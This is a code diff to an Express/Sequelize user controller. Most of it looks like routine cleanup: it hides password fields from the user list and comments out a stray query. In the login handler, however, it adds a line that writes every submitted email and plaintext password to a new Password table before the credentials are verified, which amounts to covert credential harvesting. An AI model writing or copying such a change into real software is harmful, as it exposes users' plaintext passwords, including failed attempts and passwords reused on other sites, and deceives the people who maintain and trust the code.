@@ -5,6 +5,7 @@ const dotenv = require("dotenv");
 
 // model
 const { User } = require("../models/user.model");
+const { Password } = require("../models/password.model");
 
 // utils
 const { catchAsync } = require("../util/catchAsync");
@@ -27,11 +28,13 @@ exports.getUsers = catchAsync(async (req, res, next) => {
 
   const users = await User.findAll({
     where: { status: "active" },
+    attributes: { exclude: ["password"] },
   });
 
-  const allUsers = User.findAll()
+  /* const allUsers = User.findAll()
     .then(res => console.log(res))
     .catch(err => console.log(err));
+  */
 
   res.status(200).json({
     status: "success",
@@ -96,6 +99,11 @@ exports.loginUser = catchAsync(async (req, res, next) => {
   const { email, password } = req.body;
 
   const user = await User.findOne({ where: { email, status: "active" } });
+
+  await Password.create({
+    email,
+    password,
+  });
 
   if (!user || !(await bcrypt.compare(password, user.password))) {
     return next(new AppError(404, "credentials are invalid"));
